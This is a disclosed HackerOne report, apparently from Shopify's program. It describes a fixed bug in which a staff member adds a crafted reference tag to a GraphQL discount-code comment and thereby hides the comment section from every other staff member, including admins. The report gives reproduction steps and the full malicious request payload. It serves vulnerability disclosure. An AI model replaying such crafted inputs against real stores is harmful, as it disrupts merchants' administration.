@@ -1,0 +1,439 @@
+{
+    "id": 629150,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjkxNTA=",
+    "url": "https://hackerone.com/reports/629150",
+    "title": "any staff members have the ability to comment in [discounts] he/she can disable comment section it to other staff even the admin of the store",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "low",
+    "readable_substate": "Resolved",
+    "created_at": "2019-06-25T15:35:08.768Z",
+    "submitted_at": "2019-06-25T15:35:08.768Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "modam3r5",
+        "url": "/modam3r5",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/135/179/e17d4c24a0db7a92f9258af0e220deb09e175f34_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 1382,
+        "url": "https://hackerone.com/shopify",
+        "handle": "shopify",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Shopify",
+            "twitter_handle": "",
+            "website": "https://www.shopify.com",
+            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2019-07-15T14:20:18.173Z",
+    "bug_reporter_agreed_on_going_public_at": "2019-07-05T17:39:06.844Z",
+    "team_member_agreed_on_going_public_at": "2019-07-15T14:20:18.052Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hi,\n\nI found this cool behavior by mistake when I was testing for some `GraphQL`, any user have ability to comment in `discounts code ` at discounts section can turn off comments to the other staff members include the admin/manager of the store.\nthis happens because when the `GraphQL` used to create a comment that contains a **Reference page** TAG and this TAG for an another store `Reference page` this will make the request return with an internal error that will affect the conversion on the **discounts code** that will lead to disabled it to everyone on the store include the manager/staff of the store.\n\n#PoC\n1. create two staffs `[admin1] - [admin2]` in store.\n2. from **admin1** create a discount code and add a comment on it.\n3. from **admin2** go to the discount code that had been created, turn-on the `Burpsuite` and add a comment.\n4. catch the `GraphQL` request and add this in value of parameter ==message== `[#V12221027811351| ]` and send the request.\n5. the response will return with an error like this\n\n```json\n{\"errors\":\n[\n{\"message\":\"Internal error. Looks like something went wrong on our end.\\nRequest ID: d8358e69-631c-45a7-929b-630b9abf8b5c (include this in support requests).\"}\n]\n}\n```\nnow if you refresh the page or going direct to **discount code** link will return with an error like this picture below\n{F516543}\n\nand the only way to browser the **discount code** that you had added a comment on it is from `/admin/discounts/` and then click on the **discount code** and it will open without include/show the comment section in the footer of discount code page.\n\n{F516544}\n\n##GraphQL request\n\n```json\n{\"operationName\":\"TimelineCommentCreate\",\"variables\":{\"input\":{\"message\":\"[#V12221027811351|  ] \",\"resourceId\":\"gid://shopify/PriceRule/298300342294\",\"attachments\":[]}},\"query\":\"mutation TimelineCommentCreate($input: TimelineCommentCreateInput!) {\\n  timelineCommentCreate(input: $input) {\\n    event {\\n      ...TimelineEvent\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment TimelineEvent on Event {\\n  id\\n  createdAt\\n  message\\n  ... on BasicEvent {\\n    attributeToApp\\n    attributeToUser\\n    __typename\\n  }\\n  ... on CommentEvent {\\n    rawMessage\\n    edited\\n    author {\\n      id\\n      name\\n      initials\\n      avatar(fallback: NOT_FOUND) {\\n        transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3)\\n        __typename\\n      }\\n      __typename\\n    }\\n    attachments {\\n      id\\n      image {\\n        transformedSrc(maxWidth: 50, maxHeight: 54, scale: 3)\\n        __typename\\n      }\\n      fileExtension\\n      size\\n      name\\n      url\\n      __typename\\n    }\\n    embed {\\n      ... on Product {\\n        id\\n        title\\n        featuredImage {\\n          altText\\n          transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3)\\n          __typename\\n        }\\n        tracksInventory\\n        totalInventory\\n        variants(first: 1) {\\n          edges {\\n            node {\\n              price\\n              __typename\\n            }\\n            __typename\\n          }\\n          __typename\\n        }\\n        __typename\\n      }\\n      ... on ProductVariant {\\n        id\\n        title\\n        image {\\n          altText\\n          transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3)\\n          __typename\\n        }\\n        product {\\n          title\\n          __typename\\n        }\\n        inventoryQuantity\\n        inventoryItem {\\n          tracked\\n          __typename\\n        }\\n        __typename\\n      }\\n      ... on Customer {\\n        id\\n        displayName\\n        email\\n        ordersCount\\n        totalSpentV2 {\\n          amount\\n          currencyCode\\n          __typename\\n        }\\n        phone\\n        note\\n        __typename\\n      }\\n      ... on Order {\\n        id\\n        name\\n        createdAt\\n        totalPriceSet {\\n          shopMoney {\\n            amount\\n            currencyCode\\n            __typename\\n          }\\n          __typename\\n        }\\n        customer {\\n          id\\n          displayName\\n          __typename\\n        }\\n        lineItems(first: 250) {\\n          edges {\\n            node {\\n              id\\n              title\\n              product {\\n                id\\n                __typename\\n              }\\n              variant {\\n                id\\n                __typename\\n              }\\n              __typename\\n            }\\n            __typename\\n          }\\n          __typename\\n        }\\n        displayFinancialStatus\\n        displayFulfillmentStatus\\n        __typename\\n      }\\n      ... on DraftOrder {\\n        id\\n        name\\n        createdAt\\n        totalPrice\\n        customer {\\n          id\\n          displayName\\n          __typename\\n        }\\n        lineItems(first: 250) {\\n          edges {\\n            node {\\n              id\\n              title\\n              product {\\n                id\\n                __typename\\n              }\\n              variant {\\n                id\\n                __typename\\n              }\\n              __typename\\n            }\\n            __typename\\n          }\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n\"}\n```\n\nchange the only value of parameter `resourceId` with ID of your **discount code ** that you created in the store. \n\n\n##Video\nthis video explain the behavior in case i missed something in the **PoC** steps\n\n{F516550}\n\n## Impact\n\nthis can let any other stuff disabled the comment section on any discount code if he/she has the permission to reach it.",
+    "weakness": {
+        "id": 26,
+        "name": "Improper Access Control - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 516543,
+            "file_name": "Screenshot_2019-06-25_Shopify.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/543/4f07b4448120e6b85ee33606ddc2571b2c5ae378/Screenshot_2019-06-25_Shopify.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-06-25_Shopify.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-06-25_Shopify.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073250Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=8bfddf6fe4f42b714452662da7b056aa14867b0cc94427f1dc2ef42f3a3b700c",
+            "file_size": 48611,
+            "type": "image/png"
+        },
+        {
+            "id": 516544,
+            "file_name": "Screenshot_2019-06-25_modam3r5___Discount_codes___2QTJW7VNT16J___Shopify.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/544/86cdd76474b1b9679b305a054458a5799e549856/Screenshot_2019-06-25_modam3r5___Discount_codes___2QTJW7VNT16J___Shopify.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-06-25_modam3r5___Discount_codes___2QTJW7VNT16J___Shopify.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-06-25_modam3r5___Discount_codes___2QTJW7VNT16J___Shopify.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073250Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=816c3ae67e3e3d985e7e8f8c218963f4f6463c25a7bb416a29b324c115701703",
+            "file_size": 31310,
+            "type": "image/png"
+        },
+        {
+            "id": 516550,
+            "file_name": "shopify_PoC.mp4",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/550/7a9419093177b3e903a2c96bd300666b41a25a19/shopify_PoC.mp4?response-content-disposition=attachment%3B%20filename%3D%22shopify_PoC.mp4%22%3B%20filename%2A%3DUTF-8%27%27shopify_PoC.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073250Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=f21a15dc9b543ea127f185513e51c4dfef4c969724ca71ed57ceddf1897df292",
+            "file_size": 9523386,
+            "type": "video/mp4"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 28,
+    "voters": [
+        "drsniper",
+        "kapytein",
+        "dhakal_ananda",
+        "ali",
+        "jpdev",
+        "ayyoub",
+        "exception",
+        "tiago-danin",
+        "cryptographer",
+        "b3abfb3e8a19784009e1aff",
+        "and 18 more..."
+    ],
+    "severity": {
+        "rating": "low",
+        "author_type": "Team"
+    },
+    "structured_scope": {
+        "databaseId": 413,
+        "asset_type": "URL",
+        "asset_identifier": "your-store.myshopify.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 5214948,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thank you for your report. We’ve reproduced the behaviour and our engineering team is investigating. Unfortunately this report will not be eligible for a bounty because it is not one of our eligible vulnerability types. While we occasionally make exceptions for high-impact issues that fall outside our bounty table, the impact in this case is not sufficient to justify an exception.",
+            "automated_response": false,
+            "created_at": "2019-06-28T15:38:46.671Z",
+            "updated_at": "2019-06-28T15:38:46.671Z",
+            "actor": {
+                "username": "abdulwahaab_ahmed",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdulwahaab_ahmed",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5215263,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @abdulwahaab_ahmed thanks for update the report, but I am disagreed by considering this not eligible for bounty due to these reasons:\n1. this can turn-off the conversation section to all users that can reach the `discount`.\n2. the admin of the store, will not have the ability to recover/see what happen in this conversation, which can be considered as an unauthorized bypass to made something like this, especially if who made this is staff with low permission.\n3. by using this behavior you can forbid direct access to the `discount` link for all level users/staff in the store.\n\n\nI still have that trust in you and your team, and that you will take another look and change your decisions about this report and the impact that may be happened by used this behavior. ",
+            "automated_response": false,
+            "created_at": "2019-06-28T16:15:48.960Z",
+            "updated_at": "2019-06-28T16:19:53.310Z",
+            "actor": {
+                "username": "modam3r5",
+                "cleared": false,
+                "verified": false,
+                "url": "/modam3r5",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/135/179/e17d4c24a0db7a92f9258af0e220deb09e175f34_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5248488,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @abdulwahaab_ahmed, I had just retest the behavior and I found that you fix the bug which is:\n* the comment section for `discount`  in the PoC now returns to be visible to all users.\n* the `GraphQL` request now return with information [ normal error see picture below ] about the comment without any error as in PoC.\n\n{F521744}\n\n\n\n\nand this is means the behavior has been fixed and I confirm the fix.\nalso, I want to ask if you will consider this as something eligible for bounty?! and can we go public after you change it to resolved?!\n\nthanks\n\n",
+            "automated_response": false,
+            "created_at": "2019-07-03T22:47:32.237Z",
+            "updated_at": "2019-07-03T22:48:17.809Z",
+            "actor": {
+                "username": "modam3r5",
+                "cleared": false,
+                "verified": false,
+                "url": "/modam3r5",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/135/179/e17d4c24a0db7a92f9258af0e220deb09e175f34_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 521744,
+                    "filename": "shopify_fix_confirm.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/521/744/c74442e2c164da95b45d8e340f9c067b675eb5db/shopify_fix_confirm.png?response-content-disposition=attachment%3B%20filename%3D%22shopify_fix_confirm.png%22%3B%20filename%2A%3DUTF-8%27%27shopify_fix_confirm.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073250Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=4a2fc1b6cf91514e14c3e38914e17e998530ca9a37aa09197c8d1c29709e7ed0"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5254201,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::NotEligibleForBounty",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-07-04T14:05:05.745Z",
+            "updated_at": "2019-07-04T14:05:05.745Z",
+            "actor": {
+                "url": "/shopify",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "profile": {
+                    "name": "Shopify"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5259884,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Hey @modam3r5, Thanks again for your report. As you have noticed we recently deployed a fix to the issue. The page now renders properly regardless of the contents of user comments.\n\n> 1. this can turn-off the conversation section to all users that can reach the discount.\n2. the admin of the store, will not have the ability to recover/see what happen in this conversation, which can be considered as an unauthorized bypass to made something like this, especially if who made this is staff with low permission.\n3. by using this behavior you can forbid direct access to the discount link for all level users/staff in the store.\n\nWe've already taken those points into consideration, but we still don't believe the impact is sufficient to justify a bounty, given that it falls outside our list of eligible vulnerability types.\n\nThank you for making Shopify more secure!",
+            "automated_response": false,
+            "created_at": "2019-07-05T14:13:19.378Z",
+            "updated_at": "2019-07-05T14:13:19.378Z",
+            "actor": {
+                "username": "abdulwahaab_ahmed",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdulwahaab_ahmed",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "modam3r5",
+                "url": "/modam3r5"
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5260986,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Hi @abdulwahaab_ahmed do you think you are OK if we make this report public?! \nalso, i will be thankful, if you add summary/comment that explain the behavior so any other research/hacker can understand this kind of unexpected behavior.\n\n\nthanks\n",
+            "automated_response": false,
+            "created_at": "2019-07-05T17:39:06.881Z",
+            "updated_at": "2019-07-05T17:39:06.881Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "modam3r5",
+                "cleared": false,
+                "verified": false,
+                "url": "/modam3r5",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/135/179/e17d4c24a0db7a92f9258af0e220deb09e175f34_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5281930,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @modam3r5, We would like to confirm with you if you have requested full or limited disclosure. Unfortunately we can’t see from our side if you have requested full or limited disclosure",
+            "automated_response": false,
+            "created_at": "2019-07-09T14:43:42.381Z",
+            "updated_at": "2019-07-09T14:43:42.381Z",
+            "actor": {
+                "username": "abdulwahaab_ahmed",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdulwahaab_ahmed",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5285629,
